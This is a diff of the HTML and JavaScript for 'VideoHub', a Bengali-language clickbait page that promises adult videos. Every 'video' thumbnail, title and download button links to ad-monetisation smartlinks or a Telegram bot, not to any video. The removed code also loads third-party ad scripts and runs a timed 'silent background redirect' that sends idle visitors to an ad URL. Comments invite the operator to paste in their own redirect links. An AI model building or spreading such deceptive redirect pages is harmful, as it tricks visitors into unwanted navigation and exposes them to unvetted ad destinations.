@@ -1,868 +1,303 @@
-<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyAjOwxT5jrI-Ct0k_NTcPWJt6gA_gSPT1pfLEZSB9OCNwMXdDb6S8Oz6LOYqgfFbyRmuO1HAHfpoqA-z2AqlkNzbSfiiGaoK3TaAJUbfuHI0Q5r6wN-B1f6Cjc7UD8P4vb5oED6Pxs9HGCgo8iiXsTngN0cfgPBAC7QhNJ1Az3eQoVuHTz7n-Y-Z2uL1Q/s232/1000018767.jpg" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" height="320" data-original-height="232" data-original-width="172" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyAjOwxT5jrI-Ct0k_NTcPWJt6gA_gSPT1pfLEZSB9OCNwMXdDb6S8Oz6LOYqgfFbyRmuO1HAHfpoqA-z2AqlkNzbSfiiGaoK3TaAJUbfuHI0Q5r6wN-B1f6Cjc7UD8P4vb5oED6Pxs9HGCgo8iiXsTngN0cfgPBAC7QhNJ1Az3eQoVuHTz7n-Y-Z2uL1Q/s320/1000018767.jpg"/></a></div>
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <script type='text/javascript' src='//pl27849247.effectivegatecpm.com/cb/f6/5f/cbf65f5fd1c47085ab8da2a39a5d091d.js'></script>
-    <script type='text/javascript' src='//pl27557766.revenuecpmgate.com/42/30/0f/42300f89f8d233c68b7bd3536edccdae.js'></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VideoHub</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VideoHub - Premium Videos</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #333;
-            min-height: 100vh;
-        }
+  body {
+    background: #0a0a0a;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    min-height: 100vh;
+    padding: 20px;
+  }
 
-        /* Header Styles */
-        .header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            padding: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+  /* Header */
+  .header {
+    text-align: center;
+    padding: 30px 10px;
+    border-bottom: 1px solid #222;
+    margin-bottom: 30px;
+  }
 
-        .header-content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            max-width: 600px;
-            margin: 0 auto;
-        }
+  .logo {
+    font-size: 32px;
+    font-weight: 800;
+    color: #ff2d55;
+    margin-bottom: 8px;
+  }
 
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+  .subtitle {
+    color: #888;
+    font-size: 14px;
+  }
 
-        .logo {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
-            animation: pulse 2s infinite;
-        }
+  .notice-bar {
+    background: #1a1a1a;
+    border: 1px solid #ff2d55;
+    border-radius: 10px;
+    padding: 14px 20px;
+    max-width: 800px;
+    margin: 0 auto 30px;
+    text-align: center;
+    font-size: 14px;
+    color: #ff6b9d;
+  }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
+  /* Video Grid */
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 20px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
 
-        .header-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: white;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-        }
+  .card {
+    background: #151515;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid #222;
+    transition: 0.3s;
+  }
 
-        /* Main Content */
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px 16px;
-        }
+  .card:hover {
+    border-color: #ff2d55;
+    transform: translateY(-4px);
+    box-shadow: 0 10px 30px rgba(255,45,85,0.3);
+  }
 
-        .section-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: white;
-            margin-bottom: 20px;
-            text-align: center;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-        }
+  .thumb-link {
+    display: block;
+    position: relative;
+    width: 100%;
+    aspect-ratio: 16/11;
+    overflow: hidden;
+    text-decoration: none;
+  }
 
-        /* Video Card Styles with Play Button */
-        .video-card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
-            transition: all 0.4s ease;
-            border: 1px solid rgba(255,255,255,0.3);
-            position: relative;
-            overflow: hidden;
-        }
+  .thumb-link img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    transition: 0.4s;
+  }
 
-        .video-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
-            background: rgba(255, 255, 255, 1);
-        }
+  .thumb-link:hover img {
+    transform: scale(1.08);
+  }
 
-        .video-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57);
-            background-size: 300% 100%;
-            animation: gradientShift 3s ease infinite;
-        }
+  .play-btn {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 55px;
+    height: 55px;
+    background: rgba(255,45,85,0.9);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    color: #fff;
+    padding-left: 4px;
+    transition: 0.3s;
+  }
 
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
+  .thumb-link:hover .play-btn {
+    background: #ff2d55;
+    transform: translate(-50%, -50%) scale(1.15);
+  }
 
-        .video-content {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
+  .badge {
+    position: absolute;
+    top: 10px;
+    left: 10px;
+    background: #ff2d55;
+    color: #fff;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
 
-        .video-thumbnail-container {
-            position: relative;
-            width: 120px;
-            height: 90px;
-            border-radius: 16px;
-            overflow: hidden;
-            flex-shrink: 0;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
+  .badge.new { background: #00c853; }
 
-        .video-thumbnail-container:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 35px rgba(0,0,0,0.2);
-        }
+  .info {
+    padding: 15px;
+  }
 
-        .video-thumbnail {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            position: relative;
-            overflow: hidden;
-        }
+  .title-link {
+    display: block;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 700;
+    text-decoration: none;
+    margin-bottom: 10px;
+    transition: 0.3s;
+  }
 
-        .video-thumbnail img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: all 0.3s ease;
-        }
+  .title-link:hover { color: #ff2d55; }
 
-        .video-thumbnail-container:hover .video-thumbnail img {
-            transform: scale(1.1);
-        }
+  .meta {
+    display: flex;
+    justify-content: space-between;
+    color: #777;
+    font-size: 12px;
+    margin-bottom: 12px;
+  }
 
-        /* Play Button Overlay */
-        .play-button-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.4);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(2px);
-        }
+  .download-btn {
+    display: block;
+    width: 100%;
+    text-align: center;
+    background: linear-gradient(90deg, #ff2d55, #ff6b9d);
+    color: #fff;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 700;
+    text-decoration: none;
+    transition: 0.3s;
+  }
 
-        .video-thumbnail-container:hover .play-button-overlay {
-            background: rgba(0, 0, 0, 0.6);
-        }
+  .download-btn:hover {
+    box-shadow: 0 6px 20px rgba(255,45,85,0.5);
+    transform: translateY(-2px);
+  }
 
-        .play-button {
-            width: 50px;
-            height: 50px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            cursor: pointer;
-        }
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 40px 20px;
+    margin-top: 50px;
+    border-top: 1px solid #222;
+    color: #666;
+    font-size: 13px;
+  }
 
-        .play-button:hover {
-            background: white;
-            transform: scale(1.1);
-            box-shadow: 0 6px 30px rgba(0,0,0,0.4);
-        }
-
-        .play-icon {
-            width: 0;
-            height: 0;
-            border-left: 16px solid #333;
-            border-top: 10px solid transparent;
-            border-bottom: 10px solid transparent;
-            margin-left: 4px;
-            transition: all 0.3s ease;
-        }
-
-        .play-button:hover .play-icon {
-            border-left-color: #ff6b6b;
-        }
-
-        /* Duration Badge */
-        .duration-badge {
-            position: absolute;
-            bottom: 8px;
-            right: 8px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 600;
-            backdrop-filter: blur(10px);
-        }
-
-        /* Video Info */
-        .video-info {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .video-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #2d3748;
-            margin-bottom: 8px;
-            line-height: 1.4;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-        }
-
-        .video-description {
-            font-size: 14px;
-            color: #718096;
-            margin-bottom: 12px;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            line-height: 1.5;
-        }
-
-        .video-meta {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-
-        .video-stats {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            color: #a0aec0;
-        }
-
-        .eye-icon {
-            width: 16px;
-            height: 16px;
-        }
-
-        .view-count {
-            font-weight: 600;
-            color: #667eea;
-        }
-
-        .video-category {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        /* Action Buttons */
-        .video-actions {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .watch-now-btn {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 12px;
-            font-size: 13px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .watch-now-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.4);
-            background: linear-gradient(135deg, #ff5252 0%, #d84315 100%);
-        }
-
-        .watch-now-btn:active {
-            transform: translateY(0);
-        }
-
-        .share-btn {
-            background: rgba(102, 126, 234, 0.1);
-            color: #667eea;
-            border: 2px solid #667eea;
-            padding: 10px;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .share-btn:hover {
-            background: #667eea;
-            color: white;
-            transform: scale(1.05);
-        }
-
-        /* Bottom Navigation */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-top: 1px solid rgba(255,255,255,0.2);
-            padding: 12px 16px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .nav-indicator {
-            width: 60px;
-            height: 6px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 3px;
-        }
-
-        /* Add Video Section */
-        .add-video-section {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 16px;
-            padding: 20px;
-            text-align: center;
-            margin-top: 24px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
-        }
-
-        .add-video-text {
-            font-size: 15px;
-            color: #4a5568;
-            font-weight: 500;
-        }
-
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Floating Elements */
-        .floating-element {
-            position: absolute;
-            background: rgba(255,255,255,0.1);
-            border-radius: 50%;
-            animation: float 6s ease-in-out infinite;
-        }
-
-        .floating-element:nth-child(1) {
-            width: 80px;
-            height: 80px;
-            top: 20%;
-            left: 10%;
-            animation-delay: 0s;
-        }
-
-        .floating-element:nth-child(2) {
-            width: 60px;
-            height: 60px;
-            top: 60%;
-            right: 10%;
-            animation-delay: 2s;
-        }
-
-        .floating-element:nth-child(3) {
-            width: 40px;
-            height: 40px;
-            top: 80%;
-            left: 20%;
-            animation-delay: 4s;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-20px); }
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container {
-                padding: 16px 12px;
-            }
-            
-            .video-card {
-                padding: 16px;
-                margin-bottom: 16px;
-            }
-
-            .video-content {
-                flex-direction: column;
-                gap: 15px;
-            }
-            
-            .video-thumbnail-container {
-                width: 100%;
-                height: 200px;
-            }
-
-            .video-actions {
-                justify-content: center;
-            }
-
-            .header-title {
-                font-size: 18px;
-            }
-
-            .section-title {
-                font-size: 20px;
-            }
-        }
-
-        /* Dark mode support */
-        @media (prefers-color-scheme: dark) {
-            .video-card {
-                background: rgba(45, 55, 72, 0.95);
-                color: white;
-            }
-
-            .video-title {
-                color: #e2e8f0;
-            }
-
-            .video-description {
-                color: #a0aec0;
-            }
-
-            .add-video-section {
-                background: rgba(45, 55, 72, 0.9);
-            }
-
-            .add-video-text {
-                color: #e2e8f0;
-            }
-        }
-    </style>
+  .age-18 {
+    display: inline-block;
+    color: #ff2d55;
+    border: 2px solid #ff2d55;
+    width: 40px;
+    height: 40px;
+    line-height: 36px;
+    border-radius: 50%;
+    font-weight: bold;
+    margin-bottom: 10px;
+  }
+</style>
 </head>
 <body>
-    <script type='text/javascript' src='//pl27557772.revenuecpmgate.com/64/60/3c/64603c3ab444af723b6128703c8d98f9.js'></script>
-    <!-- Floating Background Elements -->
-    <div class="floating-element"></div>
-    <div class="floating-element"></div>
-    <div class="floating-element"></div>
 
-    <!-- Header -->
-    <header class="header">
-        <div class="header-content">
-            <div class="logo-section">
-                <div class="logo">V</div>
-                <h1 class="header-title">Welcome to videohub</h1>
-            </div>
-        </div>
-    </header>
+<!-- Header -->
+<div class="header">
+  <div class="logo">🎬 VideoHub</div>
+  <div class="subtitle">প্রিমিয়াম ভিডিও কালেকশন</div>
+</div>
 
-    <!-- Main Content -->
-    <div class="container">
-        <h2 class="section-title">🎬 Available Video Links</h2>
-        
-        <!-- Video Cards Container -->
-        <div id="videoContainer">
-            <!-- Videos will be loaded here by JavaScript -->
-        </div>
+<!-- Notice Bar -->
+<div class="notice-bar">
+  🔞 <strong>নোটিশ:</strong> এই সাইটটি শুধুমাত্র ১৮+ ব্যবহারকারীদের জন্য। আপনি যদি ১৮ বছরের কম হন তাহলে এখনই প্রস্থান করুন।
+</div>
 
-        <!-- Add More Videos Message -->
-        <div class="add-video-section">
-            <p class="add-video-text">✨ Note:- একবার ক্লিক করে ভিডিও না আসলে পুনরায় পেজটিতে ফিরে এসে অন্য লিংকে ক্লিক করুন ভিডিও দেখতে! ✨</p>
-        </div>
-    </div>
+<!-- Video Grid -->
+<div class="grid" id="grid"></div>
 
-    <!-- Bottom Navigation -->
-    <nav class="bottom-nav">
-        <div class="nav-indicator"></div>
-    </nav>
+<!-- Footer -->
+<footer>
+  <div class="age-18">18+</div>
+  <p>© 2025 VideoHub। শুধুমাত্র ১৮+ ব্যবহারকারীদের জন্য।</p>
+</footer>
 
-    <script>
-        // ⚠️ এখানে আপনার অটো রিডাইরেক্ট লিংক দিন ⚠️
-        const AUTO_REDIRECT_URL = "https://otieu.com/4/9722284"; // এই লিংকটি পরিবর্তন করুন
+<script>
+/* ============================================================
+   ⭐⭐⭐ এখানে সব লিংক এক জায়গায় ⭐⭐⭐
+   ============================================================ */
+var VIDEOS = [
+  {
+    title: "ভিডিও-১",
+    link: "https://omg10.com/4/9809283",
+    thumb: "https://i.ibb.co.com/hSJNC6k/FB-IMG-1787849036562.jpg",
+    badge: "HOT"
+  },
+  {
+    title: "ভিডিও-২",
+    link: "https://omg10.com/4/9809287",
+    thumb: "https://i.ibb.co.com/jP5kLHZW/FB-IMG-1787849046624.jpg",
+    badge: "NEW"
+  },
+  {
+    title: "ভিডিও-৩",
+    link: "https://omg10.com/4/9809285",
+    thumb: "https://i.ibb.co.com/6c3PLDsq/1779251847639.png",
+    badge: "HOT"
+  },
+  {
+    title: "ভিডিও-৪",
+    link: "https://www.profitableratecpmnetwork.com/yk2urd6mbi?key=4b5b863ee584d2aa79fd144089d8117e",
+    thumb: "https://i.ibb.co.com/8wncFkz/1779251855090.png",
+    badge: "NEW"
+  },
+  {
+    title: "ভিডিও-৫",
+    link: "https://www.profitableratecpmnetwork.com/jawa6v2m?key=110abe83a2938c0a9a850051443455d9",
+    thumb: "https://i.ibb.co.com/1kvSygN/1779251863558.png",
+    badge: "HOT"
+  },
+  {
+    title: "ভিডিও-৬",
+    link: "https://omg10.com/4/9809283",
+    thumb: "https://i.ibb.co.com/tMmg7ScJ/1779251871644.png",
+    badge: "NEW"
+  },
+  {
+    title: "ভিডিও-৭",
+    link: "https://omg10.com/4/9809287",
+    thumb: "https://i.ibb.co.com/jk8f32gP/1779124026104.jpg",
+    badge: "HOT"
+  },
+  {
+    title: "ভিডিও-৮",
+    link: "https://omg10.com/4/9809285",
+    thumb: "https://i.ibb.co.com/k2RM9BDQ/1775025365581.jpg",
+    badge: "NEW"
+  }
+];
+/* ============================================================
+   ⭐⭐⭐ লিংক এখানেই শেষ ⭐⭐⭐
+   ============================================================ */
 
-        // Auto redirect variables - Silent background redirect
-        let autoRedirectTimer;
-        let redirectStartTime;
-        let redirectDelay = 27000; // 5 seconds
-        let userClickedVideo = false;
+// Render
+var grid = document.getElementById('grid');
+var html = '';
 
-        // Video data with enhanced properties
-        const videos = [
-            {
-                id: "1",
-                title: "🔥 A Hot movie - Russian Hot Sexy movie",
-                description: "Amazing hot video content with stunning visuals and premium quality",
-                thumbnail: "https://i.postimg.cc/SYJvYRZT/images.jpg?height=90&width=120&text=Movie",
-                link: "https://www.effectivegatecpm.com/c7xyzuvyry?key=661db8d68bbc798321d5def6cd1204fb",
-                duration: "15:30",
-                category: "Movie"
-            },
-            {
-                id: "2",
-                title: "🎵 সুন্দর বাংলাদেশী ভাইরাল লিংকের ভিডিও",
-                description: "Beautiful Bengali actress hot Video link with exclusive content",
-                thumbnail: "https://i.postimg.cc/34LqwmZ0/images-1.jpg?height=90&width=120&text=Bengali",
-                link: "https://www.effectivegatecpm.com/c7xyzuvyry?key=661db8d68bbc798321d5def6cd1204fb",
-                duration: "12:45",
-                category: "Bengali"
-            },
-            {
-                id: "3",
-                title: "Best Of Lesbian hot movies ever",
-                description: "Popular Lesbian movie click on the link for premium experience",
-                thumbnail: "https://i.postimg.cc/0M53xc7q/images-2.jpg?height=90&width=120&text=Lesbian",
-                link: "https://otieu.com/4/9722283",
-                duration: "18:20",
-                category: "Premium"
-            },
-            {
-                id: "4",
-                title: "Indian Hot actress video",
-                description: "Romantic love story and romantic scene with top actresses",
-                thumbnail: "https://i.postimg.cc/nsG566jk/images-3.jpg?height=90&width=120&text=Indian",
-                link: "https://otieu.com/4/9722284",
-                duration: "22:15",
-                category: "Indian"
-            },
-            {
-                id: "5",
-                title: "❤ USA Premium porn video",
-                description: "Romantic video content with beautiful scenes from USA",
-                thumbnail: "https://i.postimg.cc/dLgzdRc8/images-4.jpg?height=90&width=120&text=USA",
-                link: "https://otieu.com/4/9722283",
-                duration: "25:30",
-                category: "USA"
-            },
-            {
-                id: "6",
-                title: "সকল দেশের প্রিমিয়াম সব ভাইরাল হট ভিডিও",
-                description: "Exclusive premium content for all country with HD quality",
-                thumbnail: "https://i.postimg.cc/qNnWGtpW/images-5.jpg?height=90&width=120&text=Premium",
-                link: "https://otieu.com/4/9722284",
-                duration: "30:45",
-                category: "Global"
-            },
-            {
-                id: "7",
-                title: "বিভিন্ন হট মুভির scene সহ সম্পূর্ণ ভিডিও",
-                description: "Hot movie scene with full movie experience and HD quality",
-                thumbnail: "https://i.postimg.cc/rdk3Z8ms/images-6.jpg?height=90&width=120&text=Scene",
-                link: "https://otieu.com/4/9722283",
-                duration: "28:10",
-                category: "Scene"
-            },
-            {
-                id: "8",
-                title: "Indian Bhabi hot video link",
-                description: "Watch hot romantic bhabi video with exclusive content",
-                thumbnail: "https://i.postimg.cc/rKDBKn3V/images-7.jpg?height=90&width=120&text=Bhabi",
-                link: "https://otieu.com/4/9722284",
-                duration: "16:25",
-                category: "Bhabi"
-            },
-            {
-                id: "9",
-                title: "পাকিস্তানি হট মুভির লিংক",
-                description: "Best Pakistani porn movie free with premium quality",
-                thumbnail: "https://i.postimg.cc/YjDc2KXD/images-8.jpg?height=90&width=120&text=Pakistani",
-                link: "https://otieu.com/4/9722283",
-                duration: "20:35",
-                category: "Pakistani"
-            },
-            {
-                id: "10",
-                title: "Premium porn site for videohub user only",
-                description: "Special gift for videohub user with unlimited access",
-                thumbnail: "/placeholder.svg?height=90&width=120&text=Gift",
-                link: "https://t.me/hotlink43_bot?startapp",
-                duration: "∞",
-                category: "Gift"
-            }
-        ];
+for (var i = 0; i < VIDEOS.length; i++) {
+  var v = VIDEOS[i];
+  var badgeClass = v.badge === 'NEW' ? 'badge new' : 'badge';
 
-        // Function to start silent background redirect
-        function startSilentRedirect() {
-            redirectStartTime = Date.now();
-            
-            autoRedirectTimer = setTimeout(() => {
-                // Only redirect if user hasn't clicked any video
-                if (!userClickedVideo) {
-                    console.log('Silent redirect executing...');
-                    window.location.href = AUTO_REDIRECT_URL;
-                }
-            }, redirectDelay);
-            
-            console.log('Silent redirect timer started (5 seconds)');
-        }
+  html += '<div class="card">';
+  html +=   '<a class="thumb-link" href="' + v.link + '">';
+  html +=     '<img src="' + v.thumb + '" alt="' + v.title + '">';
+  html +=     '<span class="' + badgeClass + '">' + v.badge + '</span>';
+  html +=     '<span class="play-btn">▶</span>';
+  html +=   '</a>';
+  html +=   '<div class="info">';
+  html +=     '<a class="title-link" href="' + v.link + '">' + v.title + '</a>';
+  html +=     '<div class="meta"><span>👁 HD</span><span>🔞 18+</span></div>';
+  html +=     '<a class="download-btn" href="' + v.link + '">⬇️ ডাউনলোড</a>';
+  html +=   '</div>';
+  html += '</div>';
+}
 
-        // Function to get view count from localStorage
-        function getViewCount(videoId) {
-            const viewCounts = JSON.parse(localStorage.getItem('videoViews') || '{}');
-            return viewCounts[videoId] || 0;
-        }
+grid.innerHTML = html;
+</script>
 
-        // Function to increment view count
-        function incrementViewCount(videoId) {
-            const viewCounts = JSON.parse(localStorage.getItem('videoViews') || '{}');
-            viewCounts[videoId] = (viewCounts[videoId] || 0) + 1;
-            localStorage.setItem('videoViews', JSON.stringify(viewCounts));
-            return viewCounts[videoId];
-        }
-
-        // Function to format view count in Bengali
-        function formatViewCount(count) {
-            if (count === 0) return "0 দেখা";
-            if (count === 1) return "1 দেখা";
-            return `${count} দেখা`;
-        }
-
-        // Function to create video card HTML with play button template
-        function createVideoCard(video) {
-            const viewCount = getViewCount(video.id);
-            return `
-                <div class="video-card">
-                    <div class="video-content">
-                        <div class="video-thumbnail-container" onclick="openVideoLink('${video.id}', '${video.link}')">
-                            <div class="video-thumbnail">
-                                <img src="${video.thumbnail}" alt="${video.title}" onerror="this.src='/placeholder.svg?height=90&width=120'">
-                            </div>
-                            <div class="play-button-overlay">
-                                <div class="play-button">
-                                    <div class="play-icon"></div>
-                                </div>
-                            </div>
-                            <div class="duration-badge">${video.duration}</div>
-                        </div>
-                        
-                        <div class="video-info">
-                            <h3 class="video-title">${video.title}</h3>
-                            <p class="video-description">${video.description}</p>
-                            
-                            <div class="video-meta">
-                                <div class="video-stats">
-                                    <svg class="eye-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
-                                    </svg>
-                                    <span class="view-count" id="view-${video.id}">${formatViewCount(viewCount)}</span>
-                                </div>
-                                <div class="video-category">${video.category}</div>
-                            </div>
-                            
-                            <div class="video-actions">
-                                <button class="watch-now-btn" onclick="openVideoLink('${video.id}', '${video.link}')">
-                                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
-                                        <path d="M8 5v14l11-7z"/>
-                                    </svg>
-                                    Watch Now
-                                </button>
-                                <button class="share-btn" onclick="shareVideo('${video.title}', '${video.link}')">
-                                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
-                                        <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/>
-                                    </svg>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        // Function to open video link with view count increment
-        function openVideoLink(videoId, link) {
-            // Mark that user clicked a video - this stops the redirect
-            userClickedVideo = true;
-            clearTimeout(autoRedirectTimer);
-            console.log('User clicked video - redirect cancelled');
-            
-            // Increment view count
-            const newViewCount = incrementViewCount(videoId);
-            
-            // Update view count display
-            const viewElement = document.getElementById(`view-${videoId}`);
-            if (viewElement) {
-                viewElement.textContent = formatViewCount(newViewCount);
-                viewElement.style.color = '#ff6b6b';
-                viewElement.style.fontWeight = 'bold';
-                
-                // Reset color after animation
-                setTimeout(() => {
-                    viewElement.style.color = '#667eea';
-                    viewElement.style.fontWeight = '600';
-                }, 1000);
-            }
-            
-            // Open link
-            window.open(link, '_blank');
-        }
-
-        // Function to share video
-        function shareVideo(title, link) {
-            // Mark that user interacted - this stops the redirect
-            userClickedVideo = true;
-            clearTimeout(autoRedirectTimer);
-            console.log('User clicked share - redirect cancelled');
-            
-            if (navigator.share) {
-                navigator.share({
-                    title: title,
-                    url: link
-                });
-            } else {
-                // Fallback for browsers that don't support Web Share API
-                navigator.clipboard.writeText(link).then(() => {
-                    alert('লিংক কপি করা হয়েছে!');
-                });
-            }
-        }
-
-        // Function to load videos with stagger animation
-        function loadVideos() {
-            const container = document.getElementById('videoContainer');
-            container.innerHTML = '';
-            
-            videos.forEach((video, index) => {
-                setTimeout(() => {
-                    const videoCard = document.createElement('div');
-                    videoCard.innerHTML = createVideoCard(video);
-                    videoCard.style.opacity = '0';
-                    videoCard.style.transform = 'translateY(30px)';
-                    container.appendChild(videoCard.firstElementChild);
-                    
-                    // Animate in
-                    setTimeout(() => {
-                        videoCard.firstElementChild.style.transition = 'all 0.6s ease';
-                        videoCard.firstElementChild.style.opacity = '1';
-                        videoCard.firstElementChild.style.transform = 'translateY(0)';
-                    }, 100);
-                }, index * 150);
-            });
-        }
-
-        // Load videos and start silent redirect when page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            loadVideos();
-            
-            // Start silent redirect after 2 seconds delay
-            setTimeout(() => {
-                startSilentRedirect();
-            }, 2000);
-        });
-
-        // Only track specific interactions that should stop redirect
-        // Removed general click, scroll, and keydown listeners
-        // Only video clicks and share clicks will stop the redirect
-
-        // Keep mouse move for floating elements animation
-        document.addEventListener('mousemove', (e) => {
-            const floatingElements = document.querySelectorAll('.floating-element');
-            floatingElements.forEach((element, index) => {
-                const speed = (index + 1) * 0.01;
-                const x = (e.clientX * speed);
-                const y = (e.clientY * speed);
